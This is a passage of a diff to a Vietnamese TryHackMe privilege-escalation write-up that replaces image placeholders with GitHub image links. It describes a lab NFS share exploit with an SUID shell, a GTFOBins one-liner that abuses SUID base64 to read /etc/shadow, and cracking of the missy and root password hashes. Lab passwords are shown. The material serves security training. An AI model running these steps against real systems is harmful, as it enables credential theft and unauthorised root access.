 Tìm kiếm mountable shares trên máy karen: 
 
-![img](139)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image139.png?raw=true)
 
 => 3 mountable shares
 
@@ -790,17 +787,17 @@ Tìm kiếm mountable shares trên máy karen:
 
 Kiểm tra trên máy attack kali, liệt kê mountable shares:
 
-![img](140)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image140.png?raw=true)
 
 Trên máy karen, kiểm tra 3 path này:
 
-![img](141)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image141.png?raw=true)
 
 => không truy cập được backup và matt là nơi chứa flag
 
 Trên máy attack, truy cập vào thư mục mnt, tạo dir mới có tên là jrpentestthm:
 
-![img](142)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image142.png?raw=true)
 
 Sử dụng lệnh 
 
@@ -812,37 +809,37 @@ Lệnh này sẽ:
 
 - Cho phép chế độ đọc-ghi (read-write) với thư mục được gắn.
 
-![img](143)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image143.png?raw=true)
 
 Sau khi gán thư mục từ máy tấn công sang máy karen thành công:
 
-![img](144)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image144.png?raw=true)
 
 cd vào jrpentestthm và tạo shell c:
 
-![img](145)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image145.png?raw=true)
 
 Payload được lấy từ đây:
 
-![img](146)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image146.png?raw=true)
 
-![img](147)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image147.png?raw=true)
 
 Chuyển file nfs.c thành dạng thực thi nfs:
 
-![img](148)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image148.png?raw=true)
 
 Cấp quyền cho shell nfs và gán SUID:
 
-![img](149)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image149.png?raw=true)
 
 Kiểm tra bên máy karen: 
 
-![img](150)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image150.png?raw=true)
 
 Sau đó thực thi ./nfs và tìm ra flag:
 
-![img](151)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image151.png?raw=true)
 
 **Task 12: Capstone Challenge**
 
@@ -854,69 +851,69 @@ Password: Penny123
 
 Thử tìm kiếm các file có quyền ghi: 
 
-![img](152)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image152.png?raw=true)
 
 Thử tìm kiếm: 
 
 ***find / -type f -perm -04000 -ls 2>/dev/null***  sẽ liệt kê các tệp có bit SUID hoặc SGID được đặt.
 
-![img](153)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image153.png?raw=true)
 
 Để ý thấy /usr/bin/base64 có bit SUID được đặt => có thể lợi dụng để thực thi shell giúp leo thang đặc quyền.
 
 Thử cd vào home và kiểm tra
 
-![img](154)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image154.png?raw=true)
 
 Có thể flag1 nằm trong missy và flag2 nằm trong rootflag directory
 
 Tìm kiếm SUID trên gtfobins: 
 
-![img](155)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image155.png?raw=true)
 
     LFILE=/home/missy/flag1.txt
     /usr/bin/base64 “$LFILE” | base64 --decode
 
-![img](156)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image156.png?raw=true)
 
 => Không tìm được. 
 
 Thử đọc file /etc/shadow:
 
-![img](157)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image157.png?raw=true)
 
 Tiếp tục thử: 
 
     LFILE=/etc/shadow
     /usr/bin/base64 “$LFILE” | base64 --decode
 
-![img](158)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image158.png?raw=true)
 
 => Tìm ra hash pass của missy. Thử giải mã:
 
-![img](159)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image159.png?raw=true)
 
 => pass của missy là Password1
 
 Đăng nhập tài khoản missy: 
 
-![img](160)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image160.png?raw=true)
 
 Tìm kiếm file flag1.txt: 
 
-![img](161)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image161.png?raw=true)
 
 Khi khai thác file /etc/shadow, tìm được: 
 
-![img](162)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image162.png?raw=true)
 
 => Mật khẩu của account root. Thử giải mã: 
 
-![img](163)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image163.png?raw=true)
 
 Tìm ra password của root. Login vào tk root:
 
-![img](164)
+![img](https://github.com/DucThinh47/TryHackMe/blob/main/Jr_Penetration_Tester/Privilege-Escalation/images/image164.png?raw=true)
 
 
 
